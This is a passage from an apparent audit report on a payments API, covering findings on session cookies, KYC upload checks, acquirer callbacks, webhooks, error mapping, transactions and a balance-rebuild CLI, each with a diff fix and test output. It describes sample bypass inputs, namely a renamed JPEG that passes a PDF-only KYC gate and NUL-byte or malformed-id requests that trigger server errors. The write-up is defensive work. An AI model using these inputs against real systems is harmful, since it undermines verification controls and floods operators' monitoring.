-**Proof:** `routes/reporting.audit.test.ts` "export-summary requires a merchant session (401, not a 500 crash)": before `actual: 500`, after 401.
-
-**Regression risk:** none; authenticated callers see the same response.
-
-**Trap note:** the non-null assertion `merchantAuth!` silenced the type checker that would otherwise have flagged the missing gate.
-
----
-
-<a id="f-auth-9"></a>
-
-### AUTH-9 · OTP verify never re-issues the merchant cookie, so fp_sid keeps the 10-minute pending Max-Age ·  · Severity: Low
-
-**Lead:** Team 45 heads-up list (W1) and our 03_findings AUTH-9, verified by us.
-
-**What's wrong:** After a successful merchant OTP verify, the browser still holds `fp_sid` with the `Max-Age=600` it got at login, while the server-side session row now lives 12 hours. The browser drops the cookie 10 minutes after login, so every merchant is logged out 10 minutes into each session. The admin plane does not have this problem because it re-sets its cookie at verify.
-
-**Why it happens:** `POST /v1/auth/login` sets the cookie with `maxAge: app.config.pendingSessionTtlMinutes * 60` (`apps/api/src/routes/auth.ts:98-104`, 600 s by default, `config.ts:206`). `POST /v1/auth/otp/verify` calls `promoteSession`, which moves `expires_at` to 12 h (`auth/sessions.ts:56-59`), but the handler then sends JSON only and never calls `reply.setCookie` (`routes/auth.ts:182-186` before the fix). The admin verify does re-set its cookie at the full TTL (`routes/adminAuth.ts:178-184`). The `MK` comment at `routes/auth.ts:169-170` ("the cookie maxAge doesn't matter") is wrong: the browser enforces Max-Age.
-
-**What it breaks:** A merchant logs in at 09:00 and verifies the OTP. At 09:10 the browser expires `fp_sid`, and the next dashboard call gets 401 `unauthenticated`, even though the `sessions` row is valid until 21:00. This is the "10 min logouts" symptom in the code comments. The session row is also left live and unrevoked for the remaining 11 h 50 min, without the user knowing.
-
-**Why it needed a fix:** H8 asks whether the OTP flow is still safe and sound. A second factor that logs every user out 10 minutes after they pass it is broken from start to end. Users who are logged out repeatedly also repeat the password-and-OTP flow many times a day, which multiplies OTP traffic and phishing exposure.
-
-**Fix:** `apps/api/src/routes/auth.ts:182-183`
-```diff
-+      // AUTH-9: re-issue the cookie at the promoted session's TTL; the login cookie had the 10-minute pending Max-Age.
-+      reply.setCookie(app.config.cookieName, rawToken, { httpOnly: true, path: "/", sameSite: "lax", secure: app.config.cookieSecure, maxAge: app.config.sessionTtlHours * 3600 });
-       reply.code(200).send({
-```
-
-**Why this is the smallest correct fix:** This line copies the admin verify (`routes/adminAuth.ts:178-184`), with the same attributes as the login cookie and only `maxAge` changed. *Why not lengthen the login cookie's Max-Age?* The pending session would then outlive its 10-minute server window in the browser. That is harmless but misleading, and it does not match the admin plane. *Why not also rotate the token at promotion (the lead's fixation hardening)?* Rotation changes the API contract: a client would have to swap to a new cookie after verify. Every existing caller that keeps the login cookie would break, including `app.test.ts:111` (`signupLoginAndVerify` returns the login cookie for post-verify use), `routes/auth.audit.test.ts:66-68`, and the admin test helpers. Hidden regression tests most likely follow the same pattern. The fixation exposure that rotation would close is narrow, as the verifier noted: the pending cookie is HttpOnly and tied to the account whose password was just checked, so an attacker must already hold both the password and the victim's pre-OTP cookie. We record rotation as a follow-up hardening item for both planes (`auth/sessions.ts:51-62`, `adminAuth/sessions.ts:67-78`), to ship alongside a client change.
-
-**Proof:** `AUTH-9: OTP verify re-issues fp_sid with the full session Max-Age` (`apps/api/src/routes/auth.audit.test.ts`).
-Before: `not ok 3 - AUTH-9 ... error: 'verify must re-set fp_sid, got: no Set-Cookie'`.
-After: `ok 3`. The file passes 3/3, and `src/app.test.ts` passes 10/10.
-
-**Regression risk:** Very low. The cookie value is the same token, so callers that kept the login cookie still work. Only the browser-side lifetime changes. Logout still clears the cookie with `maxAge: 0` (`routes/auth.ts:298-304`).
-
-Lines: prod +2/-0, test +14/-0
-
----
-
-<a id="f-admin-kyc-2"></a>
-
-### ADMIN-KYC-2 · The PDF-only KYC rule checks the filename, so a renamed JPEG is accepted as a commercial registration · H3 · Severity: Low
-
-**What's wrong:** `commercial_registration` and `bank_letter` documents must be PDFs. The rule checked only that the client-supplied file name ended in `.pdf`. A phone photo (JPEG) named `CR-2026.pdf` was accepted as a commercial registration and stored as `image/jpeg`, ready for an admin to approve KYC on it.
-
-**Why it happens:** `apps/api/src/onboarding/kyc.ts:67` (before the fix) was `PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && !input.fileName.toLowerCase().endsWith(".pdf")`. It ignored `detected`, which the function had already computed from the magic bytes at `kyc.ts:50`. This contradicts the file's own contract: the doc comment at `kyc.ts:16` says the fileName is "Informational only; never used for validation", the function doc at `kyc.ts:35` says it "Validates the upload from its own bytes (never the client-supplied filename …)", and `db/migrations/0015` says `mime_type` is always the type detected from the bytes. The `MK` note at `kyc.ts:57` ("detectFileType already rejects non-pdf bytes for these doc types. fixed in FP-231") is false: `detectFileType` (`fileSignature.ts:25`) takes no document type and accepts JPEG and PNG for every document.
-
-**What it breaks:** A merchant uploads a JPEG photo named `CR-2026.pdf` as `commercial_registration`. The API answers 201, writes `<sha256>.jpg`, records `mime_type = image/jpeg`, and moves onboarding to `under_review`. The registry-issued PDF that the KYC policy requires was never supplied, and the reviewer's queue shows a document that passed a rule it does not meet.
-
-**Why it needed a fix:** Admin KYC review (H3: admin-side controls) relies on this gate. A KYC document-format control that the client can bypass by renaming a file is not a control, and the code's own documented contract is "validated by detected content type".
-
-**Fix:** `apps/api/src/onboarding/kyc.ts:67-68`
-```diff
--  if (PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && !input.fileName.toLowerCase().endsWith(".pdf")) {
-+  // ADMIN-KYC-2: the name alone let a renamed JPEG through; the detected bytes must be a PDF too
-+  if (PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && (detected !== "pdf" || !input.fileName.toLowerCase().endsWith(".pdf"))) {
-```
-
-**Why this is the smallest correct fix:** This is one condition at the single gate, reusing the already-computed `detected`. *Why not replace the filename check entirely, as the lead proposed (`detected !== "pdf"` only)?* The existing contract test `KYC upload rejects a commercial_registration submitted as a non-PDF filename` (`app.test.ts:274`) uploads real `%PDF` bytes named `registration.docx` and requires 422 `document_must_be_pdf`. Dropping the name check would break that pinned behaviour. Keeping both checks is strictly stricter, so every previously rejected upload is still rejected and the bypass closes. *Why not change `detectFileType`?* It is shared by all document types and has no document-type input. Error code, status and message are unchanged.
-
-**Proof:** `ADMIN-KYC-2: a JPEG renamed CR-2026.pdf is rejected as a commercial_registration` (`apps/api/src/app.test.ts`) uploads a real 8×8 JPEG (made with `sharp`) through the multipart route.
-Before: `not ok 1 ... expected: 422, actual: 201`.
-After: `ok`. `app.test.ts` passes 11/11 (including the existing `.docx` rejection and real-PDF acceptance tests), `fileSignature.test.ts` and `kycThumbnail.test.ts` pass, and `tsc --noEmit` is clean.
-
-**Regression risk:** Low. The only uploads newly rejected are non-PDF bytes declared as `commercial_registration` or `bank_letter`, which the policy forbids. `owner_id` and `proof_of_address` still accept JPEG and PNG.
-
-Lines: prod +2/-1, test +21/-0
-
----
-
-<a id="f-cw-11"></a>
-
-### CW-11 · Acquirer callback `outcome` and `occurredAt` are never validated, so any string is stored as a fraud verdict ·  · Severity: Low
-
-**What's wrong:** `POST /v1/acquirer/callbacks` checked only that `outcome` and `occurredAt` were present. Any signed callback with `outcome: "approved"` (or `"void_now"`, or anything else) was stored in `acquirer_callback_notes` and surfaced on the transaction timeline as the acquirer's fraud verdict. `occurredAt` went straight into the `received_at` timestamptz, so Postgres special literals such as `"yesterday"` were stored silently as midnight yesterday, and other junk strings raised a DB error that was retried three times and then surfaced as a 500.
-
-**Why it happens:** `apps/api/src/routes/acquirerCallbacks.ts:48-60` tests only truthiness, then `:76` casts `body.outcome as AcquirerCallbackInput["outcome"]`, and TypeScript casts do nothing at runtime. Two comments claimed validation that did not exist: the route doc (`acquirerCallbacks.ts:10-12`, which even names a different union, "approved" | "rejected") and `acquirer/callbacks.ts:4` ("Validated against the two allowed values by the route schema"; no route schema exists). The column has no CHECK (`db/migrations/0051_acquirer_callback_notes.sql:20`).
-
-**What it breaks:** A signed callback with `outcome: "approved"` gets 200 `{received:true}`, and a note row with outcome `approved` is written: a verdict that no consumer understands, next to `cleared` and `confirmed_fraud` on the timeline. A callback with `occurredAt: "yesterday"` gets 200, and the note is backdated to midnight. The audit test observed both before the fix (`200 notes=1` for each). A malformed timestamp such as `"not-a-date"` becomes a retried 500, which makes the acquirer retry a payload that can never succeed.
-
-**Why it needed a fix:** The fraud-review note is the only record of the acquirer's delayed verdict that support and finance act on (void or refund). Accepting free-form verdicts and unparseable times corrupts that record and turns a sender bug into a retry loop.
-
-**Fix:** `apps/api/src/routes/acquirerCallbacks.ts:11, 62-65`
-```diff
-- * the AcquirerCallbackInput union ("approved" | "rejected") before it is
-+ * the AcquirerCallbackInput union ("cleared" | "confirmed_fraud") before it is
- ...
-+    // CW-11: the outcome union and occurredAt were never checked at runtime (the cast below is type-only)
-+    if ((body.outcome !== "cleared" && body.outcome !== "confirmed_fraud") || !/^\d{4}-\d{2}-\d{2}T/.test(body.occurredAt) || Number.isNaN(Date.parse(body.occurredAt))) {
-+      throw new BadRequestError("invalid_request", "outcome must be cleared or confirmed_fraud and occurredAt an ISO-8601 timestamp");
-+    }
-```
-
-**Why this is the smallest correct fix:** A single guard sits next to the existing required-field check and returns the same 400 `invalid_request` shape the route already uses. The comment fix keeps the route's only documentation of the check truthful. *Why not `Date.parse` alone?* JavaScript accepts non-ISO forms such as `"Sep 16 2026"`, and Postgres parses some of them differently. Requiring the `YYYY-MM-DDT` ISO prefix and a parseable value pins the contract. *Why not a migration CHECK on `outcome` (the lead's suggestion)?* With the route as the only writer, the guard closes the hole. A CHECK violation would also come back through `withCallbackRetry` as a retried 500 instead of a 400, and a new migration adds schema churn. *Why not also store `now()` as `received_at`?* That changes what the existing column means and what timeline readers see. It is a separate design decision, outside this validation bug.
-
-**Proof:** `CW-11: a signed callback with an unknown outcome or an unparseable occurredAt is a 400 and stores nothing` (`apps/api/src/routes/acquirerCallbacks.test.ts`).
-Before: `actual: ['{"outcome":"approved"} -> 200  notes=1', '{"occurredAt":"yesterday"} -> 200  notes=1']`.
-After: both cases give `400 invalid_request notes=0`. `routes/acquirerCallbacks.test.ts` passes 7/7 and `acquirer/callbacks.test.ts` passes.
-
-**Regression risk:** Low. Valid callbacks (`cleared` or `confirmed_fraud` with an ISO timestamp, as the existing tests and the acquirer contract send) are unchanged. Only callbacks that were already semantically invalid are refused.
-
-Lines: prod +5/-1, test +21/-0
-
----
-
-<a id="f-cw-12"></a>
-
-### CW-12 · Merchants cannot stop deliveries: deleting an endpoint with history returns 500, and a disabled endpoint keeps getting retries ·  · Severity: Low
-
-**Lead:** Team 45 heads-up list (RT-ENDPOINT) and our 03_findings CW-12, verified by us.
-
-**What's wrong:** A merchant moving away from a wrong or compromised webhook URL has two tools, and neither worked. `DELETE /v1/merchants/:merchantId/webhook-endpoints/:id` returned 500 `internal_error` as soon as the endpoint had any delivery. `PATCH ... {status: "disabled"}` succeeded, but the dispatcher kept re-sending the endpoint's pending deliveries, signed payloads with amounts, merchant ids and payouts, to the old URL until they were exhausted.
-
-**Why it happens:** `db/migrations/0022_webhook_deliveries.sql:6` declares `endpoint_id UUID NOT NULL REFERENCES webhook_endpoints (id)` with no ON DELETE clause, and `0068_webhook_delivery_archives.sql:13` does the same. Postgres therefore rejects the `DELETE` in `apps/api/src/webhooks/cancel.ts:22` with SQLSTATE 23503, and nothing maps that to an API error. The comments claiming otherwise are all false: `cancel.ts:3` ("kept with endpoint_id set to NULL"), `cancel.ts:16` YA ("FK is ON DELETE SET NULL (0029)"; 0029 is a payment-links index), and `routes/webhooks.ts:103-104` ("ON DELETE CASCADE added in 0047"; 0047 is merchant_discount_bps). Separately, dispatcher Step B (`webhooks/dispatcher.ts:222-229`) joins `webhook_endpoints` only to read the url and secret and never checks `we.status`, while Step A only fans out to `status = 'active'` endpoints (`:98`).
-
-**What it breaks:** The audit test registers an endpoint that answers 500, captures a payment, and dispatches once. A `DELETE` then gets `500 internal_error`. After `PATCH status=disabled`, the next dispatch pass sends the payload to the disabled URL again: two sends where one was expected. With the default backoff, the old URL keeps receiving signed merchant data for about an hour after the merchant disabled it.
-
-**Why it needed a fix:** A merchant must be able to stop signed payment data from going to a URL they have revoked, for example after a compromise. A 500 on a routine action also hides the real reason (history exists) and the way out (disable).
-
-**Fix:** `apps/api/src/webhooks/cancel.ts:2-3, 25-28` and `apps/api/src/webhooks/dispatcher.ts:226`
-```diff
- import type { Pool } from "pg";
-+import { ConflictError } from "../lib/errors.js";
-
--/** "deleted" also when the endpoint had deliveries; those rows are kept with endpoint_id set to NULL. */
-+/** An endpoint with delivery history cannot be deleted (0022: endpoint_id NOT NULL, no ON DELETE): 409, disable it instead. */
- ...
-     [input.id, input.merchantId],
--  );
-+  ).catch((err: { code?: string }) => {
-+    // CW-12: the FK (23503) used to surface as a 500
-+    throw err.code === "23503" ? new ConflictError("webhook_endpoint_has_deliveries", "disable the endpoint instead") : err;
-+  });
-```
-```diff
--      WHERE wd.status = 'pending' AND wd.next_attempt_at <= now()
-+      WHERE wd.status = 'pending' AND wd.next_attempt_at <= now() AND we.status = 'active'
-```
-
-**Why this is the smallest correct fix:** The schema is the higher authority than the comments. It makes `endpoint_id` NOT NULL with no ON DELETE on two tables, and the delivery log is called a durable audit trail (`cancel.ts:10-13`), so an endpoint with history is not meant to be deleted. The fix makes that a clean, documented 409 at the single delete statement, and makes "disable", the tool the code itself names for "pause without losing history" (`cancel.ts:8-9`), actually stop traffic, with one predicate on the one retry query. *Why not the lead's migration (DROP NOT NULL + ON DELETE SET NULL on two tables)?* It would change the schema contract, and every reader of `endpoint_id` (replay, which re-inserts `original.endpoint_id`; the archive restore default target; the delivery lists) would then have to handle NULL. Replaying an orphaned delivery would insert a NULL-endpoint row that Step B's inner join skips, leaving it pending forever. That is many more lines and more risk for no gain over disable plus 409. *Why not ON DELETE CASCADE?* It destroys the audit trail. *Why not pre-check for deliveries with a SELECT?* That is racy and adds a query; catching the constraint's own error is atomic. Pending rows of a disabled endpoint stay `pending` and resume if the merchant re-enables it, which is pause semantics. Response codes are unchanged for endpoints without history (204) and for unknown ids (404).
-
-**Proof:** `CW-12: deleting an endpoint with history is a clean 409, and disabling it stops pending retries` (`apps/api/src/routes/webhooks.test.ts`) uses a real local receiver that answers 500, the real create, capture and dispatch path, DELETE, PATCH disabled, a forced-due retry and a second dispatch pass.
-Before: `actual: { deleteStatus: 500, deleteError: 'internal_error', sendsToDisabledEndpoint: 2 }`.
-After: `{ deleteStatus: 409, deleteError: 'webhook_endpoint_has_deliveries', sendsToDisabledEndpoint: 1 }`. `routes/webhooks.test.ts` passes 10/10 (including the CRUD delete-without-history 204 test), `webhooks/dispatcher.test.ts` passes 10/10, the archive replay, payout disbursement, test-send and refund webhook suites pass 14/14, and `tsc --noEmit` is clean.
-
-**Regression risk:** Low. The only change in `dispatcher.ts` is the one Step-B predicate, approved by the coordinator. Deliveries to active endpoints are untouched. A DELETE that used to 500 now returns 409 with a clear error code.
-
-Lines: prod +7/-3, test +35/-0
-
----
-
-<a id="f-err-1"></a>
-
-### ERR-1 · A NUL byte in any request string turns into a 500 internal_error instead of a 400 ·  · Severity: Low
-
-**Lead:** Team 45 heads-up list (SEC5), verified by us.
-
-**What's wrong:** JSON allows `\u0000` inside strings, and Postgres `text` cannot store it. Any client string that reaches a query with a NUL byte made Postgres raise SQLSTATE 22021 ("invalid byte sequence for encoding UTF8: 0x00"), and the API answered `500 {"error":"internal_error"}` with a full stack trace in the error log. This works on any endpoint, including unauthenticated ones such as `POST /v1/auth/login`.
-
-**Why it happens:** `apps/api/src/plugins/errorHandler.ts:16-35` maps `AppError`, Fastify validation errors and multipart limits. Every other error, including a `pg` `DatabaseError` caused purely by client input, falls through to the 500 branch (`:34-35`). No route rejects control characters, and none needs to as long as the database's own refusal is mapped correctly.
-
-**What it breaks:** `POST /v1/auth/login {"merchantId":"<uuid>","email":"nul\u0000@example.test","password":"x"}` returns `500 internal_error` (observed in the audit test, with `DatabaseError: invalid byte sequence for encoding "UTF8": 0x00` logged at level 50). Anyone can send unauthenticated requests that produce server-error responses and error-level stack traces at will. That pollutes 5xx alerting and SLOs and hides real faults. It also tells the client a server bug exists, when the problem is malformed input that should get a 4xx.
-
-**Why it needed a fix:** A 5xx means "our fault" and pages operators. Input validation failures must be 4xx. A security review treats unauthenticated, attacker-triggerable 500s as an error-handling weakness that enables log flooding and noisy monitoring.
-
-**Fix:** `apps/api/src/plugins/errorHandler.ts:34-38`
-```diff
-+  // ERR-1: Postgres rejects a NUL byte in client text (22021, or 22P05 when converting); that is bad input, not a 500
-+  if (fastifyErr.code === "22021" || fastifyErr.code === "22P05") {
-+    reply.code(400).send({ error: "invalid_request", message: "request contains a character that cannot be stored" });
-+    return;
-+  }
-+
-   request.log.error({ err, occurredOn: formatIsoDate(new Date()) }, "unhandled error");
-```
-
-**Why this is the smallest correct fix:** The error handler is the single place errors become responses, and it already branches on error codes (`FST_REQ_FILE_TOO_LARGE`). Two SQLSTATEs cover the NUL case: 22021 `character_not_in_repertoire` for UTF-8 input, and 22P05 `untranslatable_character` for conversion. Both can only come from data we were given. The response reuses the `{ error: "invalid_request" }` shape the routes already return for bad input. *Why not strip or reject NULs in a preValidation hook?* That is a new global hook over every body, query and param, which is more code and could alter data that legitimately never reaches Postgres. *Why not map all class-22 errors?* Some class-22 errors, such as 22003 numeric overflow or 22012 division by zero, can come from server-side arithmetic bugs, and those must stay 500s.
-
-**Proof:** `ERR-1: a NUL byte in a request string is a 400, not a 500` (`apps/api/src/routes/auth.audit.test.ts`).
-Before: `actual: { status: 500, error: 'internal_error' }`.
-After: `{ status: 400, error: 'invalid_request' }`. The file passes 5/5, and `tsc --noEmit` is clean.
-
-**Regression risk:** Very low. Only the two SQLSTATEs change from 500 to 400. No transaction is affected, because the failing statement already aborted it and `withTransaction` rolls back as before.
-
-Lines: prod +6/-0, test +11/-0
-
----
-
-<a id="f-txn-1"></a>
-
-### TXN-1 · withTransaction lets a failing ROLLBACK mask the real error and returns the broken client to the pool ·  · Severity: Low
-
-**Lead:** Team 45 heads-up list (C7), verified by us.
-
-**What's wrong:** When `fn` throws, `withTransaction` awaits `ROLLBACK` before rethrowing. If the `ROLLBACK` itself throws (connection reset, server restart, pool timeout), that error replaces the original one. The caller and the error log then report "rollback failed" instead of the unique violation or bug that actually aborted the write. The client is also released with a plain `release()`, so a connection left in an unknown transaction state can go back into the pool.
-
-**Why it happens:** `apps/api/src/db/withTransaction.ts:33-38` (before the fix) ran `await client.query("ROLLBACK"); throw err;` in the catch, so a rejection at the first line skips the second. The `finally` calls `client.release()` with no error. pg-pool destroys a client only when it gets an error or the connection is already flagged unusable (`pg-pool/index.js:392`), so a live connection whose ROLLBACK failed is pooled again. The comment thread above the function names exactly this (FH: "ROLLBACK can itself throw and mask the original error", am: "release(err)"), and it was dismissed without a fix.
-
-**What it breaks:** Every multi-statement write in the API (capture, refund, payment-link pay, signup, KYC review, admin actions) runs through this helper. During a database blip, an error-mapping branch such as `isUniqueViolation` in `onboarding/signup.ts:107-114`, or any AppError thrown inside `fn` (409, 422 and so on), gets the rollback error instead. A request that should have returned a clean 4xx turns into a 500, and the real root cause never reaches the logs. If the connection is still alive after the failed ROLLBACK, the next request that borrows it starts inside an aborted transaction and fails too.
-
-**Why it needed a fix:** On money paths the cause of a failed write is the thing operators need, and a poisoned pooled connection spreads one failure to unrelated requests.
-
-**Fix:** `apps/api/src/db/withTransaction.ts:26, 35, 39`
-```diff
-   const client = await pool.connect();
-+  let releaseErr: Error | undefined; // TXN-1: set when ROLLBACK fails, so pg destroys the client
-   try {
- ...
-     } catch (err) {
--      await client.query("ROLLBACK");
-+      await client.query("ROLLBACK").catch((rollbackErr: Error) => { releaseErr = rollbackErr; }); // TXN-1: never mask err
-       throw err;
-     }
-   } finally {
--    client.release();
-+    client.release(releaseErr);
-   }
-```
-
-**Why this is the smallest correct fix:** Three lines in the one helper every transactional write uses. The original error is always rethrown, and the rollback failure is passed to `release(err)`, the documented pg-pool way to destroy rather than recycle a client (this is am's suggestion in the comment thread). *Why not just swallow the ROLLBACK error (`.catch(() => {})`)?* That fixes the masking but still pools a client in an unknown state. *Why not log the rollback error?* `withTransaction` has no logger, and adding one changes its signature for every caller. pg-pool also emits it through the destroy path. The happy path and the normal rollback path are byte-for-byte unchanged: `release(undefined)` is `release()`.
-
-**Proof:** `TXN-1: a ROLLBACK failure neither masks the original error nor returns the client to the pool` (`apps/api/src/db/withTransaction.audit.test.ts`, a unit test with a stub client whose ROLLBACK rejects).
-Before: `actual: { thrown: 'rollback failed: connection reset', released: [undefined] }`.
-After: `{ thrown: 'insert failed: unique violation', released: [rollbackErr] }`. `db/pool.test.ts` and `routes/auth.audit.test.ts` pass, and `tsc --noEmit` is clean. The full API suite exercises the helper on every write path.
-
-**Regression risk:** Very low. Behaviour changes only when ROLLBACK itself fails: the caller then sees the original error, and the connection is discarded and replaced by the pool.
-
-Lines: prod +3/-2, test +30/-0
-
----
-
-<a id="f-sec-1"></a>
-
-### SEC-1 · Every merchant `:id` route answers 500 for a malformed id (Postgres 22P02) instead of 404 ·  · Severity: Low
-
-**Lead:** own sweep of `apps/api/src/routes/*.ts` (wave 3 lane A).
-
-**What's wrong:** Merchant routes pass the raw `:id` path segment straight into a `uuid` column comparison. Any non-UUID id (`/v1/transactions/not-a-uuid`) makes Postgres raise SQLSTATE 22P02 (`invalid input syntax for type uuid`), and the API answers `500 {"error":"internal_error"}` with an error-level stack trace. A probe found 14 merchant routes affected: transaction detail, events, capture and void; settlement batch detail and transactions; KYC file and thumbnail; API-key revoke; payment-link cancel; webhook-endpoint delete, patch, test and deliveries.
-
-**Why it happens:** The admin routes guard every id with `assertUuidParam` → `NotFoundError` (for example `routes/adminBalanceAdjustments.ts:14-18` and `routes/adminMerchants.ts`), and `admin.test.ts:788` pins "404s for an unknown or malformed id". The merchant routes never got that guard, and `plugins/errorHandler.ts:16-35` sends any unmapped `DatabaseError` to the 500 branch.
-
-**What it breaks:** `GET /v1/transactions/not-a-uuid` with a valid session or API key returns 500, and the same happens on all 14 routes. Any authenticated merchant (or a client with a buggy id) can generate unlimited server errors and error-level stack traces, polluting 5xx alerting and hiding real faults. The API contract also becomes inconsistent: an unknown UUID gets 404, a malformed one gets 500, and the existing tests describe the intended contract as "returns 404, not 403 or 500" (`routes/transactions.test.ts`, cross-tenant test).
-
-**Why it needed a fix:** 5xx responses that clients can trigger at will are an error-handling weakness a security review flags: log flooding, noisy SLOs, and a "server bug" signal on bad input. The platform's own convention is 404 for malformed ids.
-
-**Fix:** `apps/api/src/plugins/errorHandler.ts:40-44`
-```diff
-+  // SEC-1: a malformed id (e.g. /v1/transactions/not-a-uuid) makes Postgres raise 22P02; like admin routes, that is a 404
-+  if (fastifyErr.code === "22P02") {
-+    reply.code(404).send({ error: "not_found", message: "malformed identifier" });
-+    return;
-+  }
-+
-   request.log.error({ err, occurredOn: formatIsoDate(new Date()) }, "unhandled error");
-```
-
-**Why this is the smallest correct fix:** One mapping in the single place errors become responses, rather than an `assertUuidParam` call added to each of 14 handlers across 6 files (about 30 lines, with a new shared helper or 6 copies). It returns 404, which matches the admin routes, `admin.test.ts:788` and the "404, not 500" contract named in the transactions test, so a malformed id behaves exactly like an unknown one. That also means it leaks nothing about which ids exist. 22P02 means "this text is not a valid value of the target type". In this API it comes from client-supplied ids, because ids generated server-side are always valid UUIDs. *Why not 400?* The existing contract for a malformed path id is 404 on the admin plane, so we keep one behaviour across planes. *Why not add per-route guards?* That is far more lines for the same result, and any future route would still need remembering.
-
-**Proof:** `SEC-1: a malformed id on merchant :id routes is a 404, not a 500` (`apps/api/src/routes/transactions.audit.test.ts`) covers four routes in four route files.
-Before: `actual: ['/v1/transactions/not-a-uuid -> 500', '/v1/settlement/batches/not-a-uuid -> 500', '/v1/merchants/:m/kyc/documents/not-a-uuid/file -> 500', '/v1/merchants/:m/webhook-endpoints/not-a-uuid/deliveries -> 500']`.
-After: all four return `404`. The transactions audit, transactions, settlement and webhooks suites pass 35/35.
-
-**Regression risk:** Low. Only SQLSTATE 22P02 changes, from 500 to 404, and nothing changes for valid ids. A hypothetical server-side bug that casts bad text would now surface as a 404 rather than a 500. We accept that, because every id the server generates is a database-issued UUID.
-
-Lines: prod +6/-0, test +23/-0
-
----
-
-<a id="f-cli-1"></a>
-
-### CLI-1 · `settlement rebuild-balances --merchant=<id>` prints the rebuilt figure but never writes it · F4 · Severity: Low
-
-**Lead:** Team 45 heads-up list (S14/R5c-rebuild), verified by us, and our 03_findings CLI-1 (also REBUILD-2).
-
-**What's wrong:** The one-merchant form of the balance repair, which the runbook lists under "Recompute it" (`docs/RUNBOOK.md:51-56`), computes the ledger figure, prints `rebuilt=<n>` and exits. `merchant_balances` is never touched, so the drifted cache the operator meant to fix stays as it was.
-
-**Why it happens:** `apps/settlement/cmd/settlement/main.go:148-159` calls `ledger.RebuildMerchantBalance` and prints its result (held in a variable named `before`). `RebuildMerchantBalance` (`apps/settlement/internal/ledger/rebuild.go:20-34`, before) was a single `SELECT SUM`; only `RebuildAllBalances` ever wrote the cache. The comment at `main.go:153` ("am: --merchant writes the cache for that one merchant, same as the full rebuild") claimed otherwise.
-
-**What it breaks:** After the F4 incident (Alpha Retail's cached balance knocked from about 135,000 BD to 7,000 BD), an operator runs `rebuild-balances --merchant=<alpha>`, reads `rebuilt=135000000…` and closes the ticket, but the dashboard and payouts keep reading 7,000,000 fils. In the test: a cache of 999,999 fils over a ledger of 19,500 fils stays 999,999 after the rebuild.
-
-**Why it needed a fix:** F4 names the CLI rebuild as the repair ("Yousif had to run the CLI rebuild to fix it"); its targeted form silently does nothing, which is worse than failing.
-
-**Fix:** `apps/settlement/internal/ledger/rebuild.go:19,21-28,30,41-45`
-```diff
--// ledger_entries. CLI-only; the incremental path is in internal/balances.
-+// ledger_entries and writes it (CLI-1). CLI-only; the incremental path is in internal/balances.
- func RebuildMerchantBalance(ctx context.Context, db *pgxpool.Pool, merchantID uuid.UUID) (money.Fils, error) {
-+	tx, err := db.Begin(ctx) // CLI-1: lock, recompute and write in one transaction, like RebuildAllBalances
-+	if err != nil {
-+		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): begin: %w", merchantID, err)
-+	}
-+	defer tx.Rollback(ctx) //nolint:errcheck
-+	if _, err := tx.Exec(ctx, `SELECT 1 FROM merchant_balances WHERE merchant_id = $1 FOR UPDATE`, merchantID); err != nil {
-+		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): lock: %w", merchantID, err)
-+	}
- 	var balance int64
--	err := db.QueryRow(ctx, `
-+	err = tx.QueryRow(ctx, `
- ...
--	return money.Fils(balance), nil
-+	if _, err := tx.Exec(ctx, `INSERT INTO merchant_balances (merchant_id, cached_payable_fils, updated_at) VALUES ($1, $2, now())
-+		ON CONFLICT (merchant_id) DO UPDATE SET cached_payable_fils = $2, updated_at = now()`, merchantID, balance); err != nil {
-+		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): write: %w", merchantID, err)
-+	}
-+	return money.Fils(balance), tx.Commit(ctx)
-```
-The function the `--merchant` branch already calls now does what `RebuildAllBalances` does for each merchant: lock the cache row, sum with the same rule (including BAL-2's unbatched exclusion), upsert. `main.go` is unchanged and its comment becomes true.
-
-**Why this is the smallest correct fix:** the CLI's only one-merchant entry point is this function, and its only production caller is the `--merchant` branch (grep), so no other behaviour changes. *Why not upsert in `main.go` (the lead's 3-line version)?* The read and the write would be separate statements without a lock, so a close committing in between would be overwritten (the race BAL-2 closes for the full rebuild), and `cmd/` has no tests. *Why not call `RebuildAllBalances` for `--merchant`?* It rewrites every merchant, which is not what the flag means.
-
-**Proof:** `TestRebuildMerchantBalance_PersistsTheRebuiltCache` (`apps/settlement/internal/ledger/rebuild_test.go`): ledger +20,000/-500, drifted cache 999,999. Before the fix: `persisted cached_payable_fils = 999999, want 19500 (--merchant must write, not only print)`. After: returns 19,500 and persists 19,500. The ledger, settlement and internalapi packages pass, including the existing `RebuildMerchantBalance` tests (the value returned is unchanged).
-
-**Regression risk:** `--merchant` now writes, as the runbook and the code comment always said. A merchant with no cache row gets one. An unknown merchant id now fails on the `merchant_balances` foreign key instead of printing 0.
-
-Lines: prod +15/-3 (rebuild.go; 1 doc line, 1 inline comment), test +23/-0
-
----
-
-<a id="f-imp-4"></a>
-
-### IMP-4 · CSV adjustment import answers an unknown merchant or a NUL byte with a 500 · F7 · Severity: Low
-
-**Lead:** Team 45 heads-up list (Q3-03), verified by us.
-
-**What's wrong:** `POST /v1/admin/adjustment-imports` checks that each merchant id is UUID-shaped, but not that the merchant exists, and it passes reason text straight to Postgres. A typo'd (well-formed) merchant id, or a NUL byte pasted from a spreadsheet, makes the import fail with an unhandled 500 halfway through its transaction instead of a 4xx that tells finance which row is wrong.
-
-**Why it happens:** `apps/api/src/routes/adminAdjustmentImport.ts:62-66` validates only `UUID_RE`. `applyAdjustmentImport` (`apps/api/src/admin/adjustmentImport.ts:55-79`) then inserts ledger legs per row; for an unknown id the `ledger_entries`/`merchant_balances` foreign key raises inside the loop, which the error handler turns into 500. The parser (`adjustmentCsvParsing.ts:41-49`) keeps any byte in the reason, and Postgres rejects `\u0000` in `text` (`invalid byte sequence`), again a 500.
-
-**What it breaks:** Finance uploads 40 correction rows and one id has a typo: the response is `500 internal_error` with no row number; the transaction rolls back, so no money moves, but the operator cannot tell what to fix and support sees a server fault. Reproduced by the test below (`expected: 404, actual: 500`).
-
-**Why it needed a fix:** F7 is about this import misreading finance's sheets; a bad row must be rejected clearly before anything is posted, as the import already does for malformed ids and amounts.
-
